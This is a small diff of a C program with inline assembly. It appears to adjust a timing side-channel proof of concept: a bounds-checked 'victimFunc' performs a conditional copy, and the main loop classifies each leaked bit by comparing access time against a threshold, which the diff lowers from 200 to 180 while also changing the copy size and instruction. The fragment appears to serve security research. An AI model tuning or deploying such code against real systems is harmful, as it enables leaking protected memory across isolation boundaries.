@@ -107,14 +107,14 @@ void victimFunc(uint64_t idx) {
       cmp %%r11d, %%eax
       jbe done
       movl     (%2),%%ebx
-      mov     $0xBB8,%%rdx 
+      mov     $4022,%%rdx 
       mov     $4,%%rcx   
       mov     $0,%%r10d
       cmp     %%ebx,%%r10d
       cmovne  %%rdx, %%rcx
       mov %4,%%rsi 
       mov %3,%%rdi
-      rep movsw
+      rep movsb
       call dummy 
       
    //  movl (%5),%%r9d 
@@ -179,7 +179,7 @@ int main(void) {
                 uint64_t access_time2 = start_time();
                 dummy();
                 uint64_t start = stop_time() - access_time2;
-                results[bit]=(start > 200)?1:0;
+                results[bit]=(start > 180)?1:0;
 
                 printf("%d,%d \n", results[bit],start);
     }
